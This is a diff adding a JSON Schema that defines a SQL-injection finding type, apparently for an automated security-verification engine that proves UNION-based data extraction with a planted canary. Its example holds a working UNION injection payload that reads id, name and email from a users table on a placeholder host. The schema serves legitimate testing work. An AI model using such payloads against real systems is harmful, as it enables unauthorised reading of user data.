@@ -1,0 +1,84 @@
+{
+  "$schema": "https://json-schema.org/draft/2020-12/schema",
+  "title": "sqli.union_extract",
+  "description": "In-band SQLi proven to read a NAMED table: the engine plants a fresh {{nonce}} canary into a target table via a legitimate write, then proves an injected UNION surfaces that canary in the response while a benign control does not.",
+  "x-flags": "(http — no extra flag; -authstate when auth.required)",
+  "x-notes": [
+    "Mirrors idor.read: setup_resource writes the canary, the injected read pulls it back. The canary is the per-run {{nonce}} — place {{nonce}} in the setup_resource body/URL (e.g. a name field AND a unique-key field like email so the write does not collide on re-runs).",
+    "Reflection-proof: the nonce is sent ONLY in the setup write, never in the search request, so its appearance in the search response can only come from the database.",
+    "The engine builds the extract and control arms by planting each payloads value into injection.location of base_request. extract is the UNION (or sub-select) that reads the target column; control is benign and must NOT return the canary. kind=query|form needs name; json_body needs json_pointer.",
+    "Author the extract UNION to surface the canary (read the whole target column; do not filter by the nonce, or you reintroduce reflection). Match the base query's column count/types from your confirmed PoC.",
+    "Set auth.required + -authstate when the write or read needs a session; the credential headers are applied to setup, extract, and control. Declare side_effects.cleanup to remove the canary when the target supports it."
+  ],
+  "type": "object",
+  "additionalProperties": false,
+  "required": ["finding_id", "type", "target", "evidence", "proof"],
+  "properties": {
+    "finding_id": { "type": "string", "minLength": 1 },
+    "type": { "const": "sqli.union_extract" },
+    "target": { "$ref": "#/$defs/target" },
+    "auth": { "$ref": "#/$defs/auth" },
+    "controls": { "type": "array", "items": { "$ref": "#/$defs/request" } },
+    "mutation_slots": { "$ref": "#/$defs/mutation_slots" },
+    "side_effects": { "$ref": "#/$defs/side_effects" },
+    "evidence": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["setup_resource", "base_request", "injection"],
+      "properties": {
+        "setup_resource": { "$ref": "#/$defs/request" },
+        "base_request": { "$ref": "#/$defs/request" },
+        "injection": {
+          "allOf": [{ "$ref": "#/$defs/injection" }],
+          "properties": {
+            "payloads": {
+              "required": ["control", "extract"]
+            }
+          }
+        }
+      }
+    },
+    "proof": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": ["expected_marker_in_extract", "expected_marker_absent_in_control"],
+      "properties": {
+        "expected_marker_in_extract": { "type": "boolean" },
+        "expected_marker_absent_in_control": { "type": "boolean" }
+      }
+    }
+  },
+  "examples": [
+    {
+      "finding_id": "sqli-union-extract-id",
+      "type": "sqli.union_extract",
+      "target": {
+        "expected_origin": "https://app.example.com",
+        "allowed_hosts": ["app.example.com"],
+        "allowed_schemes": ["https"],
+        "allowed_ports": [443]
+      },
+      "auth": { "required": false },
+      "evidence": {
+        "setup_resource": {
+          "method": "POST",
+          "url": "https://app.example.com/api/auth/register",
+          "headers": [{ "name": "content-type", "value": "application/json" }],
+          "body": "{\"email\":\"canary_{{nonce}}@example.test\",\"password\":\"pw12345\",\"full_name\":\"{{nonce}}\"}"
+        },
+        "base_request": { "method": "GET", "url": "https://app.example.com/products/search?q=1" },
+        "injection": {
+          "location": { "kind": "query", "name": "q" },
+          "payloads": {
+            "control": "nomatch_zzz",
+            "extract": "nomatch_zzz' UNION SELECT id, full_name, email, 0, '', '', 0 FROM users-- -"
+          }
+        }
+      },
+      "proof": {
+        "expected_marker_in_extract": true,
+        "expected_marker_absent_in_control": true
+      }
+    }
+  ]
+}
